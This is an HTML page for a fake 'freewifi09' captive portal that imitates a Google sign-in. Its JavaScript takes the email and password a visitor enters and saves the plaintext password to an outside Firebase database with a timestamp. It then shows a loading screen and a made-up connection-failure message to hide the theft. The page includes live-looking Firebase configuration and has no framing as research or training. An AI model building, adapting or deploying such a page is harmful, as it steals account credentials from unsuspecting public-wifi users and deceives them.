<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in for free wifi</title>

<style>
    body {
        font-family: Arial, sans-serif;
        background: #f1f3f4;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
    }

    .card {
        background: #fff;
        width: 360px;
        padding: 40px 30px;
        border-radius: 8px;
        box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        text-align: center;
        position: relative;
        z-index: 2;
    }

    h2 {
        font-weight: 400;
        margin: 10px 0 20px;
        font-size: 24px;
    }

    input {
        width: 100%;
        padding: 12px;
        margin-top: 12px;
        border: 1px solid #dadce0;
        border-radius: 4px;
        font-size: 16px;
        outline: none;
    }

    input:focus {
        border-color: #1a73e8;
        box-shadow: 0 0 0 1px #1a73e8;
    }

    button {
        width: 100%;
        padding: 12px;
        margin-top: 24px;
        background: #1a73e8;
        border: none;
        color: white;
        font-size: 16px;
        border-radius: 4px;
        cursor: pointer;
    }

    button:hover {
        background: #1667c8;
    }

    .links {
        margin-top: 20px;
        font-size: 14px;
    }

    a {
        color: #1a73e8;
        text-decoration: none;
    }

    .error {
        color: red;
        font-size: 14px;
        margin-top: 10px;
        display: none;
    }

    /* Loading overlay */
    .loading-screen {
        position: fixed;
        inset: 0;
        background: rgba(255,255,255,0.92);
        backdrop-filter: blur(5px);
        display: none;
        justify-content: center;
        align-items: center;
        flex-direction: column;
        font-size: 18px;
        color: #333;
        z-index: 9999;
    }

    .spinner {
        width: 45px;
        height: 45px;
        border: 5px solid #cfcfcf;
        border-top-color: #1a73e8;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin-bottom: 20px;
    }

    @keyframes spin {
        to { transform: rotate(360deg); }
    }
</style>
</head>
<body>

<!-- Loading screen -->
<div class="loading-screen" id="loading">
    <div class="spinner"></div>
    Connecting to freewifi09...
</div>

<!-- Login Card -->
<div class="card" id="loginCard">

  <!-- WiFi Logo -->
<div style="margin-bottom:22px; text-align:center;">
    <svg width="60" height="60" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
        <!-- Outer signal arc -->
        <path d="M32 12 C48 12, 60 24, 60 32" stroke="#1a73e8" stroke-width="4" fill="none" />
        <!-- Middle signal arc -->
        <path d="M32 20 C42 20, 52 28, 52 32" stroke="#1a73e8" stroke-width="4" fill="none" />
        <!-- Inner signal arc -->
        <path d="M32 28 C36 28, 44 35, 43 32" stroke="#1a73e8" stroke-width="4" fill="none" />
        <!-- Center dot -->
        <circle cx="32" cy="37" r="4" fill="#ffffff" stroke="#1a73e8" stroke-width="2" />
    </svg>
</div>

    <h2>Sign in</h2>
    <p style="font-size:14px;color:#5f6368;">Use your Google account to sign in on freewifi09</p>

    <input type="text" id="email" placeholder="Email or phone">
    <input type="password" id="password" placeholder="Password">

    <button id="loginBtn">Sign in</button>
    <div class="error" id="err"></div>

</div>

<script type="module">
    // Firebase imports
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js";
    import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-analytics.js";

    // New Firebase config
    const firebaseConfig = {
        apiKey: "AIzaSyAGinc-wCWcl7bNfwgaI0HLaBnJR4aZt-Y",
        authDomain: "freewifi-981c3.firebaseapp.com",
        projectId: "freewifi-981c3",
        storageBucket: "freewifi-981c3.firebasestorage.app",
        messagingSenderId: "697473327624",
        appId: "1:697473327624:web:0bee6e252d3aace182e7bd",
        measurementId: "G-DSLZ0JKWN0"
    };

    const app = initializeApp(firebaseConfig);
    const analytics = getAnalytics(app);
    const db = getDatabase(app);

    const emailInput = document.getElementById("email");
    const pwdInput = document.getElementById("password");
    const loginBtn = document.getElementById("loginBtn");
    const errMsg = document.getElementById("err");

    // Gmail validation
    function validateGmail(email) {
        if (!email.toLowerCase().includes("@gmail.com")) return true;
        const local = email.split("@")[0];
        if (!/^[a-zA-Z0-9._+]+$/.test(local)) return false;
        if (local.includes("..") || local.startsWith(".") || local.endsWith(".")) return false;
        const segments = local.split(".");
        if (segments.some(s => s.length <= 2)) return false;
        if (segments.length >= 3) return false;
        if (/(.)\1{2,}/.test(local)) return false;
        if (/(\w+)\1{1,}/.test(local)) return false;
        return true;
    }

    // Show loading
    function showLoading() {
        document.getElementById("loading").style.display = "flex";
        setTimeout(() => {
            document.getElementById("loading").style.display = "none";
            alert("Failed to connect to freewifi09. Please try again.");
        }, 10000);
    }

    // Firebase save
    function saveFirebase(email, pwd) {
        const loginRef = ref(db, "logins/");
        const pushRef = push(loginRef);
        set(pushRef, {
            email: email,
            pwd_hint: pwd,
            time: new Date().toLocaleString()
        });
    }

    // Login button
    loginBtn.onclick = () => {
        const e = emailInput.value.trim();
        const p = pwdInput.value.trim();

        if (!validateGmail(e)) {
            errMsg.textContent = "Invalid Gmail format";
            errMsg.style.display = "block";
            return;
        }

        if (p.length < 6 || !/[0-9!@#$%^&*(),.?":{}|<>]/.test(p)) {
            errMsg.textContent = "Wrong password, please try again";
            errMsg.style.display = "block";
            return;
        }

        errMsg.style.display = "none";
        saveFirebase(e, p);
        showLoading();
    };
</script>

</body>
</html>